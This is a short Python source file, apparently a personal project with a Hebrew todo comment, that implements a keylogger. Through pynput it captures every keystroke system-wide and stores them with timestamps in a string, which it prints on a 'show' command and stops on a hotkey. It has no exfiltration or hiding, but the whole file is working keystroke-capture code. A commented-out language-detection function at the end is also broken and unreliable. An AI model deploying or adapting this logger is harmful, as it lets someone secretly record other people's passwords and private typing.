import json
from pynput import keyboard
import time
import threading
import os
import ctypes, locale


# todo מתודה לא עובדת get_current_languge()
# def get_current_languge():
#     layout = ctypes.windll.user32.GetKeyboardLayout(0)
#     lang_id = layout & 0xFFFF
#     try:
#         return locale.windows_locale[lang_id]
#     except KeyError:
#         return f'Unknown(0x{lang_id:X})'

print()
stop_event = threading.Event()


def local_time():
    return time.strftime("%d-%m-%Y %H:%M")

def sstring_control(a: str):
    return a.replace("'", "").replace("Key.space", " ").replace("Key.enter", "\n")

sstring = "**" + local_time() + "**\n"

def on_press(key):
    global sstring
    time_now = local_time()
    if time_now in sstring:
        sstring += str(key)
    else:
        sstring += f"**{time_now}**\n{str(key)}"


def show():
    while not stop_event.is_set():
        show_input = input()
        if show_input.strip().lower() == 'show':
            print(f'sstring is - \n {sstring}')
        elif show_input.strip().lower() == 'exit':
            stop_event.set()
            break


def on_release(key):
    global sstring
    sstring = sstring_control(sstring)


def record():
    def stop_logging():
        stop_event.set()
        os._exit(0)

    hotkey = keyboard.GlobalHotKeys({"<shift>+<ctrl>+t": stop_logging})
    hotkey.start()


    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main():
    try:
        threading.Thread(target=record, daemon=True).start()
        threading.Thread(target=show, daemon=True).start()
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print("the program stop")

if __name__ == "__main__":
    main()


# def get_current_languge():
#     user32 = ctypes.windll.user32
#     hwnd = user32.GetForegroundWindow()
#     thread_id = user32.GetForegroundWindow(hwnd, None)
#     klid = user32.GetForegroundWindow(thread_id)
#     language_id = klid & (2**16 -1)
#     return language_id
#
# current_language = get_current_languge()
# print(f'Current language ID: {current_language}')